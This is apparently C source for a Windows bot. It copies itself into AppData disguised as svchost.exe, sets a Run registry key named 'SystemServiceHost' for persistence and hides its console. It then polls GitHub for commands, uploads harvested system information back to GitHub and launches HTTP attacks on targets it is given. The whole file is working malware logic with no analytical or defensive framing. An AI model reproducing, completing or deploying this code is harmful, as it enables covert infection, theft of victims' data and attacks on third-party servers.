#include <windows.h>
#include <shlobj.h>         // SHGetFolderPath
#include <winreg.h>         // Registry
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "payload.h"
#include "../lib/command_fetch.h"
#include "../lib/config.h"
#include "info_advanced.h"
#include "upload.h"
#include "http_attack.h"

Payload parse_payload(const char* cmd) {
    Payload p;
    memset(&p, 0, sizeof(Payload));
    sscanf(cmd, "feature:%31s %127[^\n]", p.feature, p.argument);

    time_t now = time(NULL);
    strftime(p.timestamp, sizeof(p.timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    return p;
}

void print_payload(const Payload* p) {
    printf("Feature: %s\n", p->feature);
    printf("Argument: %s\n", p->argument);
    printf("Timestamp: %s\n", p->timestamp);
}

#ifdef PAYLOAD_EXEC

void hide_console() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

void upload_text_log(const char* content) {
    char filename[64];
    time_t now = time(NULL);
    struct tm* t = localtime(&now);
    strftime(filename, sizeof(filename), "log_%Y%m%d_%H%M%S.txt", t);
    upload_result_to_github(content, filename);
}

void add_to_startup(const char *path) {
    HKEY hKey;
    RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    RegSetValueEx(hKey, "SystemServiceHost", 0, REG_SZ, (BYTE*)path, strlen(path));
    RegCloseKey(hKey);
}

void copy_to_appdata_and_run() {
    char appdata[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);

    strcat(appdata, "\\svchost.exe");  // fake name

    char current_path[MAX_PATH];
    GetModuleFileName(NULL, current_path, MAX_PATH);

    if (strcmp(current_path, appdata) != 0) {
        CopyFile(current_path, appdata, FALSE);
        add_to_startup(appdata);
        ShellExecute(NULL, "open", appdata, NULL, NULL, SW_HIDE);
        exit(0);
    }
}

int main() {
    copy_to_appdata_and_run();
    hide_console();

    char last_command[1024] = {0};

    while (1) {
        char command[1024] = {0};

        if (fetch_command_from_github(command)) {
            if (strcmp(command, last_command) != 0) {
                strcpy(last_command, command);
                Payload p = parse_payload(command);

                if (strcmp(p.feature, "info_advanced") == 0) {
                    char* info = get_advanced_info();
                    upload_text_log(info);
                    free(info);
                }
                else if (strcmp(p.feature, "http_attack") == 0) {
                    perform_http_attack(p.argument);
                    upload_text_log("HTTP attack executed.");
                }
                else {
                    upload_text_log("Unknown feature.");
                }

                print_payload(&p);
            }
        }

        Sleep(DELAY_SECONDS * 1000);  // default 3s from config.h
    }

    return 0;
}
#endif
